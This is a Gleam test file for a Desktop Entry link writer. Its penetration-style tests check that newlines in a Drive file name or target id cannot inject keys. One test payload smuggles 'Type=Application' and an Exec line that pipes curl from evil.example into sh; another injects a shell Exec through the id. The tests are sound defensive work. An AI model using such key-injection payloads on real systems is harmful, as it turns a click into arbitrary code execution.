import gleam/list
import gleam/string
import iaragon/domain/link_file

// A benign name/target round-trips into a well-formed Desktop Entry link.
pub fn a_plain_link_file_is_well_formed_test() {
  let contents = link_file.build(name: "Quarterly Report", target_id: "id-1")

  assert string.starts_with(contents, "[Desktop Entry]\nType=Link\n")
  assert string.contains(contents, "\nName=Quarterly Report\n")
  assert string.contains(
    contents,
    "\nURL=https://drive.google.com/open?id=id-1\n",
  )
}

// PENTEST — the Drive display name is attacker-influenceable (a file shared
// into the user's Drive). A name carrying newlines must NOT be able to inject
// extra Desktop Entry keys: GKeyFile honours the last value of a duplicated
// key, so an injected `Type=Application` + `Exec=` would turn a click in the
// file manager into arbitrary code execution.
pub fn a_malicious_name_cannot_inject_desktop_entry_keys_test() {
  let payload =
    "Invoice\nType=Application\nExec=/bin/sh -c 'curl evil.example|sh'\nName=Invoice"
  let contents = link_file.build(name: payload, target_id: "id-x")
  let lines = string.split(contents, "\n")

  // No injected key survives as its own physical line.
  assert !list.contains(lines, "Type=Application")
  assert !list.any(lines, fn(line) { string.starts_with(line, "Exec=") })
  // Exactly one Type= line remains, and it is the legitimate Type=Link.
  let type_lines =
    list.filter(lines, fn(line) { string.starts_with(line, "Type=") })
  assert type_lines == ["Type=Link"]
  // The newlines survive as escaped sequences on the single Name= line.
  assert string.contains(contents, "\\nType=Application")
}

// PENTEST — the URL target id is treated with the same suspicion (Drive ids
// are opaque today, but the writer must not depend on that).
pub fn a_malicious_target_id_cannot_inject_keys_test() {
  let contents =
    link_file.build(name: "Doc", target_id: "id\nExec=/bin/sh -c evil")
  let lines = string.split(contents, "\n")

  assert !list.any(lines, fn(line) { string.starts_with(line, "Exec=") })
}

// A literal backslash in the name is escaped so it round-trips (and cannot be
// used to smuggle an escape sequence past the writer).
pub fn a_backslash_in_the_name_is_escaped_test() {
  let contents = link_file.build(name: "a\\b", target_id: "id-1")

  assert string.contains(contents, "Name=a\\\\b")
}
